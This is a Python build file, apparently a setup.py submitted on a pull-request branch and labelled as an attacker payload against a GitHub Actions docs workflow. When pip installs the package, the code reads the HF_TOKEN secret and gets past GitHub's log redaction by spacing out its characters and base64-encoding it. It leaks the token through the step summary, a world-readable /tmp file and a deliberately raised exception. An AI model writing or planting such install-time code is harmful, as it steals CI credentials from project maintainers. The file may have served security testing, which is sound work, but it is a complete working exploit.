# ATTACKER PAYLOAD on PR branch.
# build_docs.yml runs `pip install ./packages/fairchem-core` with HF_TOKEN in env.
# setuptools build backend imports this file in an isolated subprocess. pip
# usually swallows the subprocess stdout/stderr unless the build fails, so
# this payload deliberately RAISES with the captured secret embedded in the
# exception message — pip surfaces failed-build subprocess output to the
# actions runner log, which is our evidence channel.
#
# Bypass for GitHub log redaction: HF_TOKEN is space-separated character by
# character. GitHub redacts exact-substring matches of registered secrets;
# inserting spaces between every character defeats this.
import os, sys, base64

RCE_MARKER = "PWNED_E_ab5a3725"
tok = os.environ.get("HF_TOKEN", "<UNSET>")
spaced = " ".join(list(tok))
b64 = base64.b64encode(tok.encode()).decode()

# Workflow commands — these are surfaced regardless of pip's stdio handling
# when the actions runner parses lines from a step. But pip eats subprocess
# stdio, so we ALSO append to GITHUB_STEP_SUMMARY and finally raise so pip
# echoes the message back into its own (surfaced) stderr.
summary = os.environ.get("GITHUB_STEP_SUMMARY")
if summary:
    try:
        with open(summary, "a") as f:
            f.write("### ATTACKER_SETUP_PY_EXEC " + RCE_MARKER + "\n")
            f.write("LEAKED_HF_TOKEN_SPACED: `" + spaced + "`\n")
            f.write("LEAKED_HF_TOKEN_B64: `" + b64 + "`\n")
            f.write("LEAKED_HF_TOKEN_LEN: " + str(len(tok)) + "\n")
    except Exception:
        pass

# Also drop a world-readable file at a known path on the runner; if any
# subsequent step echoes it we win. Mostly belt-and-braces — the raise below
# is the primary evidence channel.
try:
    with open("/tmp/at_poc_e_leak", "w") as f:
        f.write(RCE_MARKER + "|" + spaced + "|" + b64 + "\n")
except Exception:
    pass

# Raise so pip echoes the exception message to the visible runner log.
raise RuntimeError(
    "ATTACKER_SETUP_PY_EXEC " + RCE_MARKER
    + " || LEAKED_HF_TOKEN_SPACED [" + spaced + "]"
    + " || LEAKED_HF_TOKEN_B64 " + b64
    + " || LEAKED_HF_TOKEN_LEN " + str(len(tok))
)
